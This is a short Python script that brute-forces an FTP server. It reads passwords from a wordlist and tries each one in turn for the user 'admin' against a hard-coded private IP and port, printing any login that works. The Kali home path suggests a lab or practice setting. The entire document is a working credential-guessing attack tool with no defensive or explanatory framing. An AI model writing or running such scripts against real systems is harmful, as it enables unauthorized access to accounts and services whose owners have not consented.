import ftplib

def brute_force_ftp(ip, port, username, password_list):

	"""
	Bruce force an FTP server using a list of passwords.
	
	Args:
		ip (str): The target IP address.
		port(int): The target port.
		username(str): The username to test.
		password_list (str): The path to the password file.
	"""
	
	try:
		with open(password_list, 'r') as file:
			passwords = file.readlines()
	except FileNotFoundError:
		print(f"Password file {password_list} not found.")
		return
	
	for password in passwords:
		password = password.strip()
		print(f"Trying password: {password}")
		
		try:
			ftp = ftplib.FTP()
			ftp.connect(ip, port, timeout=5)
			ftp.login(username, password)
			print(f"[+] Login successful: {username}: {password}")
			ftp.quit()
			return
		except ftplib.error_perm:
			print(f"[-] Login failed: {username}:{password}")
		except Exception as e:
			print(f"[!] Error: {e}")
			break
			
	print("[-] Brute-force attack completed. No valid credentials found.")

target_ip = "192.168.100.114"
target_port = 50201
username =  "admin"
password_list_path = "/home/kali/common.txt"

brute_force_ftp(target_ip, target_port, username, password_list_path)
SS
